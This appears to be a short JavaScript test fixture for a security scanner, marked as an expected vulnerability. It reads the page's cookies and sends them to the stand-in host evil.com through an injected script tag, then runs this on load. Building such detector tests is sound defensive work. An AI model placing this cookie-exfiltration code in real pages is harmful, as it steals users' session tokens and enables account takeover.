/**
 * Test: JSONP-style data leak
 * Expected: VULNERABILITY - cookie in script src
 */

function test() {
  var token = document.cookie;
  var script = document.createElement('script');
  script.src = 'https://evil.com/jsonp?callback=leak&data=' + token;
  document.head.appendChild(script);
}

test();